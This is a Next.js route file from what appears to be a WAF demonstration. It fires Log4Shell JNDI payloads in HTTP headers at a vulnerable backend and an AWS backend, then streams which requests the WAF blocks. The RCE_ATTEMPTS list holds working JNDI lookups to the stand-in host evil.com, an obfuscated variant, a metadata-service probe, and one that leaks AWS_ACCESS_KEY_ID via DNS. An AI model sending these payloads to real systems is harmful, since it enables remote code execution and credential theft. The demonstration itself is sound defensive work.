import { NextRequest } from 'next/server';
import { normalizeApiBaseUrl } from '@/lib/url-utils';
import { getTerraformOutputs } from '@/lib/terraform-state';

export const dynamic = 'force-dynamic';

const URL_MAP = {
  manual: {
    vulnerable: normalizeApiBaseUrl(process.env.VULNERABLE_API_URL || 'http://localhost:3000'),
    aws: normalizeApiBaseUrl(process.env.AWS_API_URL || ''),
  },
  auto: {
    vulnerable: normalizeApiBaseUrl(process.env.AUTO_VULNERABLE_API_URL || ''),
    aws: normalizeApiBaseUrl(process.env.AUTO_AWS_API_URL || ''),
  },
};

const STAGE_STEP_MS = 180;

const RCE_ATTEMPTS = [
  {
    label: 'JNDI LDAP / User-Agent',
    header: 'User-Agent',
    payload: '${jndi:ldap://evil.com/a}',
  },
  {
    label: 'JNDI RMI / User-Agent',
    header: 'User-Agent',
    payload: '${jndi:rmi://evil.com/payload}',
  },
  {
    label: 'JNDI DNS / X-Forwarded-For',
    header: 'X-Forwarded-For',
    payload: '${jndi:dns://evil.com/x}',
  },
  {
    label: 'JNDI 난독화 / Referer',
    header: 'Referer',
    payload: '${${::-j}${::-n}${::-d}${::-i}:rmi://evil.com/a}',
  },
  {
    label: 'AWS Metadata / X-Api-Version',
    header: 'X-Api-Version',
    payload: '${jndi:ldap://169.254.169.254/latest}',
  },
  {
    label: 'Env 탈취 / User-Agent',
    header: 'User-Agent',
    payload: '${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.evil.com/a}',
  },
];

type Env = 'vulnerable' | 'aws';
type StageName = 'attacker' | 'cloudfront' | 'waf' | 'ecs' | 'app' | 's3';
type StageStatus = 'idle' | 'reached' | 'passed' | 'blocked' | 'failed' | 'success';
type Severity = 'info' | 'warning' | 'critical' | 'success';

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

function hasJsonContentType(res: Response) {
  return (res.headers.get('content-type') || '').includes('application/json');
}

async function sendStageWithDelay(
  sendStage: (
    env: Env,
    attempt: number,
    stage: StageName,
    status: StageStatus,
    title: string,
    description: string,
    severity: Severity,
  ) => Promise<void>,
  env: Env,
  attempt: number,
  stage: StageName,
  status: StageStatus,
  title: string,
  description: string,
  severity: Severity,
) {
  await sendStage(env, attempt, stage, status, title, description, severity);
  await sleep(STAGE_STEP_MS);
}

async function probeRce(
  baseUrl: string,
  headerName: string,
  payload: string,
  attempt: number,
  label: string,
) {
  const start = Date.now();
  try {
    const res = await fetch(`${baseUrl}/api/health`, {
      method: 'GET',
      headers: { [headerName]: payload },
      signal: AbortSignal.timeout(8000),
    });

    const latency = Date.now() - start;
    // CloudFront 오탐 방지: WAF 403 → CF custom_error_response → 200+HTML
    const effectiveStatus = res.status === 200 && !hasJsonContentType(res) ? 403 : res.status;
    const blocked = effectiveStatus === 403 || effectiveStatus === 429;

    return {
      attempt,
      status: effectiveStatus,
      latency,
      blocked,
      label: blocked ? `${label} BLOCKED` : `${label} REACHED APP`,
      headerName,
      payload,
    };
  } catch {
    return {
      attempt,
      status: 0,
      latency: Date.now() - start,
      blocked: false,
      label: `${label} CONNECTION ERROR`,
      error: 'connection_refused' as const,
      headerName,
      payload,
    };
  }
}

export async function GET(request: NextRequest) {
  const searchParams = new URL(request.url).searchParams;
  const mode = searchParams.get('mode') === 'auto' ? 'auto' : 'manual';
  const customHeader = searchParams.get('header');
  const customPayload = searchParams.get('payload');

  let vulnUrl = URL_MAP[mode].vulnerable;
  let awsUrl = URL_MAP[mode].aws;

  if (mode === 'auto' && (!vulnUrl || !awsUrl)) {
    const tf = await getTerraformOutputs();
    if (!vulnUrl) vulnUrl = tf.vulnerable?.backendUrl || '';
    if (!awsUrl) awsUrl = tf.secure?.backendUrl || '';
  }

  const VULNERABLE_URL = vulnUrl || 'http://localhost:3000';
  const AWS_URL = awsUrl;

  // 커스텀 파라미터가 있으면 단일 테스트, 없으면 6개 프리셋 전체 실행
  const attempts =
    customHeader && customPayload
      ? [{ label: 'CUSTOM JNDI', header: customHeader, payload: customPayload }]
      : RCE_ATTEMPTS;

  const encoder = new TextEncoder();
  const { readable, writable } = new TransformStream();
  const writer = writable.getWriter();

  const send = async (data: object) => {
    try {
      await writer.write(encoder.encode(`data: ${JSON.stringify(data)}\n\n`));
    } catch {}
  };

  const sendStage = async (
    env: Env,
    attempt: number,
    stage: StageName,
    status: StageStatus,
    title: string,
    description: string,
    severity: Severity,
  ) => {
    await send({ type: 'stage', env, attempt, stage, status, title, description, severity });
  };

  (async () => {
    try {
      await send({ type: 'start' });

      for (let i = 0; i < attempts.length; i++) {
        const attemptNum = i + 1;
        const target = attempts[i];

        const [vulnResult, awsResult] = await Promise.all([
          probeRce(VULNERABLE_URL, target.header, target.payload, attemptNum, target.label),
          AWS_URL
            ? probeRce(AWS_URL, target.header, target.payload, attemptNum, target.label)
            : Promise.resolve({
                attempt: attemptNum,
                status: -1,
                latency: 0,
                blocked: false,
                label: 'AWS URL NOT CONFIGURED',
                headerName: target.header,
                payload: target.payload,
              }),
        ]);

        // 취약 환경 stage 이벤트
        await sendStageWithDelay(
          sendStage,
          'vulnerable',
          attemptNum,
          'attacker',
          'reached',
          'JNDI 페이로드 헤더 전송',
          `${target.header}: ${target.payload} — 취약 환경으로 요청이 전송되었습니다.`,
          'critical',
        );
        await sendStageWithDelay(
          sendStage,
          'vulnerable',
          attemptNum,
          'ecs',
          vulnResult.status > 0 ? 'reached' : 'failed',
          vulnResult.status > 0 ? 'EC2 도달' : 'EC2 도달 실패',
          '취약 환경은 WAF가 없어 JNDI 헤더 요청이 원본 서버까지 전달됩니다.',
          vulnResult.status > 0 ? 'critical' : 'warning',
        );
        await sendStageWithDelay(
          sendStage,
          'vulnerable',
          attemptNum,
          'app',
          vulnResult.status > 0 ? 'passed' : 'failed',
          vulnResult.status > 0 ? '애플리케이션 로그 기록' : '앱 도달 실패',
          vulnResult.status > 0
            ? `JNDI 페이로드가 애플리케이션 로그에 기록됩니다. Log4j 취약 버전이라면 외부 서버로 콜백이 트리거됩니다.`
            : '요청이 애플리케이션에 도달하지 못했습니다.',
          vulnResult.status > 0 ? 'critical' : 'warning',
        );

        // 보안 환경 stage 이벤트
        await sendStageWithDelay(
          sendStage,
          'aws',
          attemptNum,
          'attacker',
          'reached',
          'JNDI 페이로드 헤더 전송',
          `동일한 ${target.header} 페이로드가 보안 환경으로 전송되었습니다.`,
          'critical',
        );
        await sendStageWithDelay(
          sendStage,
          'aws',
          attemptNum,
          'cloudfront',
          'passed',
          'CloudFront 경유',
          '요청이 CloudFront 엣지를 통해 WAF 검사 단계로 전달됩니다.',
          'info',
        );

        if (awsResult.blocked) {
          await sendStageWithDelay(
            sendStage,
            'aws',
            attemptNum,
            'waf',
            'blocked',
            'WAF KnownBadInputs 차단',
            `WAF KnownBadInputsRuleSet이 JNDI 패턴을 탐지해 차단했습니다. 페이로드가 애플리케이션에 전혀 도달하지 않습니다.`,
            'success',
          );
        } else {
          await sendStageWithDelay(
            sendStage,
            'aws',
            attemptNum,
            'waf',
            'passed',
            'WAF 통과',
            '요청이 WAF를 통과했습니다.',
            'warning',
          );
          if (awsResult.status > 0) {
            await sendStageWithDelay(
              sendStage,
              'aws',
              attemptNum,
              'ecs',
              'reached',
              'EC2 도달',
              '차단되지 않은 요청이 EC2 계층에 도달했습니다.',
              'warning',
            );
            await sendStageWithDelay(
              sendStage,
              'aws',
              attemptNum,
              'app',
              'passed',
              '애플리케이션 처리',
              '차단되지 않은 요청이 서비스 로직에 도달했습니다.',
              'warning',
            );
          }
        }

        // rce_result: 카드 컴포넌트 전용 커스텀 이벤트
        await send({ type: 'rce_result', env: 'vulnerable', ...vulnResult });
        await send({ type: 'rce_result', env: 'aws', ...awsResult });

        // result: 아키텍처 시각화 + 세션 저장 호환
        await send({ type: 'result', env: 'vulnerable', ...vulnResult });
        await send({ type: 'result', env: 'aws', ...awsResult });

        await sleep(240);
      }

      await send({ type: 'complete' });
    } catch (e) {
      await send({ type: 'error', message: String(e) });
    } finally {
      writer.close();
    }
  })();

  return new Response(readable, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
    },
  });
}
